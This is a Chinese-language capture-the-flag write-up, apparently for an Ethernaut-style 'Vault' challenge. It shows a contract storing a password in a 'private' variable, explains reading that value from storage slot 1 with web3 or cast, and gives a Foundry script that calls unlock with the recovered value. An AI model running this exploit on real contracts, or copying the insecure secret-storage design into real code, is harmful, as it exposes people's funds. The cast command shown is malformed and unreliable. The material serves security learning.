合约代码：`Vault.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

目标是解锁，就是需要调用`unlock`函数，参数是32字节的密码。

` bytes32 private password`，我们可以看到`password`是一个私有的，但我们还是可以通过查存储槽来获取他的值。

有两种方法：

因为`bool`占1字节，位于存储槽0，`bytes32`占32字节，位于存储槽1。

一种是web3的：可以在控制台输入`await web3.eth.getStorageAt(contract.address, 1)`

另一种是cast的：用`cast storage 合约地址 --rpc-url 存储槽`

得到密码之后就可以写脚本了

脚本代码：`Vault_hack.s.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract MyScript is Script {

    Vault _vault = Vault(0xd561571E12C41BC7D704624399D69e4C9BBc168C);

    function run() external {
        vm.startBroadcast();

        _vault.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);

        vm.stopBroadcast();
    }
}
```

